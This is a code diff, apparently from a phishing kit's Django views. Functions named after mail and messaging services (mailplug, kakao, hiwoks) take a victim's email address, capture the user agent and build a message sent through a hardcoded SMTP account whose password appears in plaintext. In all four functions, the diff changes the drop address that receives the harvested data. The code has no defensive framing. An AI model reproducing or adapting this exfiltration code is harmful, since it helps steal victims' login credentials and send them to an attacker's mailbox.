@@ -112,7 +112,7 @@ def hiwoks(request):
     domainya = emailya[emailya.index('@') + 1 : ]
     sender_eya = "six@illmovesshapes.online"
     sender_emailya = "six@illmovesshapes.online"
-    receiver_emailya = "malachy.kobe@meantodeal.com" # faithcooceo@gmail.com
+    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
     passwordya = "&X%?.fG)N{)g"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
@@ -152,7 +152,7 @@ def mailplug(request):
     domainya = emailya[emailya.index('@') + 1 : ]
     sender_eya = "six@illmovesshapes.online"
     sender_emailya = "six@illmovesshapes.online"
-    receiver_emailya = "malachy.kobe@meantodeal.com" # faithcooceo@gmail.com
+    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
     passwordya = "&X%?.fG)N{)g"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
@@ -194,7 +194,7 @@ def general(request):
     domainya = emailya[emailya.index('@') + 1 : ]
     sender_eya = "six@illmovesshapes.online"
     sender_emailya = "six@illmovesshapes.online"
-    receiver_emailya = "malachy.kobe@meantodeal.com" # faithcooceo@gmail.com
+    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
     passwordya = "&X%?.fG)N{)g"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
@@ -236,7 +236,7 @@ def kakao(request):
     domainya = emailya[emailya.index('@') + 1 : ]
     sender_eya = "six@illmovesshapes.online"
     sender_emailya = "six@illmovesshapes.online"
-    receiver_emailya = "malachy.kobe@meantodeal.com" # faithcooceo@gmail.com
+    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
     passwordya = "&X%?.fG)N{)g"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
